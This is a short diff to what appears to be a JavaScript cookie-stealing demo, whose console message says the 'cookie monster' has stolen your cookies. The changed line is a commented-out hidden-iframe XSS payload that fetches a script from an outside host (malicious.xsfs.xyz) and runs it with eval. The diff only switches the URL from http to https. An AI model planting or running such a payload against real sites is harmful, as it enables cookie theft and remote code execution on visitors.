@@ -14,4 +14,4 @@ console.log(
   "If you see this, it means the cookie monster has stolen your cookies! Oops! 🍪"
 );
 
-// <iframe style="display: none" src="javascript:fetch(`http://malicious.xsfs.xyz/public/quiet-cookie-monster.js`).then((response) => { return response.text() }).then((data) => { eval(data) });">
+// <iframe style="display: none" src="javascript:fetch(`https://malicious.xsfs.xyz/public/quiet-cookie-monster.js`).then((response) => { return response.text() }).then((data) => { eval(data) });">
